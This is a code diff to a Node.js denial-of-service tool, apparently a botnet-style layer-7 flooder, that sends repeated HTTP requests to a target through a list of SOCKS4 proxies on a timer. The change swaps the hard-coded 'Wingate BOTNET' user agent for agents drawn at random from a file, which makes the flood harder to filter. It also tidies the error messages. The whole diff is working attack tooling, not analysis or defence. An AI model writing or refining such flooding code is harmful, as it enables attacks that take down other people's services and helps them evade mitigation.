@@ -5,6 +5,8 @@ const layer7 = require('./methods/layer7');
 
 const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
 
+const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);
+
 async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
     return new Promise((resolve, reject) => {
         const [proxyIp, proxyPort] = proxy.split(':');
@@ -26,19 +28,20 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
 
         SocksClient.createConnection(options, (err, info) => {
             if (err) {
-                console.error(`Failed to connect to ${targetUrl}: `);
+                console.error(`Failed to connect to ${targetUrl} via ${proxy}`);
                 reject(err);
                 return;
             }
 
             if (layer7[method]) {
+                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                 const req = http.request({
                     host: target.hostname,
                     port: target.port || 80,
                     path: target.pathname,
                     method: 'GET', 
                     headers: {
-                        'User-Agent': 'Wingate BOTNET',
+                        'User-Agent': userAgent, 
                     },
                     socket: info.socket, 
                 }, (res) => {
@@ -48,9 +51,9 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
 
                 req.on('error', (err) => {
                     if (err.code === 'ECONNRESET') {
-                        console.error(`Connection reset by ${proxy}: `);
+                        console.error(`Connection reset by ${proxy}`);
                     } else {
-                        console.error(`Error with ${proxy}: `);
+                        console.error(`Error with ${proxy}`);
                     }
                     reject(err);
                 });
@@ -70,9 +73,9 @@ function start(targetUrl, delay, kbSize, method) {
 
         sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
             if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
-                console.error(`Connection error with ${proxy}: `);
+                console.error(`Connection error with ${proxy}`);
             } else {
-                console.error(`Error with ${proxy}: `);
+                console.error(`Error with ${proxy}`);
             }
         });
     }, delay); 
